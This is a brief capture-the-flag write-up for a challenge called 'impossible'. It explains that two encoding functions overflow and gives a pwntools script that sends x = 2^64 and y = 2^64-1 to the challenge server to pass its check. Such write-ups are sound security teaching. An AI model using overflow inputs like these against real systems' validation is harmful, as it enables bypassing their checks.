
### impossible

The conditions look impossible but we can find that the functions zero_encoding and one_encoding are vulnerable to overflow.
To pass the condition, we can set `x` and `y` as `x = 2^64` and `y = 2^64-1`, for example, and then, we got the flag.


```#!/usr/bin/env python3

from pwn import *

host = args.HOST or 'challs.actf.co'
port = int(args.PORT or 32200)

payload_x = f'{pow(2, 64)}\n'.encode()
payload_y = f'{pow(2, 64)-1}\n'.encode()

conn = remote(host, port)

response = conn.recvuntil(b'x: ')
print(response.decode(), end='')
print(payload_x.decode())
conn.sendline(payload_x)

response = conn.recvuntil(b'y: ')
print(response.decode(), end='')
print(payload_y.decode())
conn.sendline(payload_y)
 
response = conn.recvline()
print(response.decode())
```
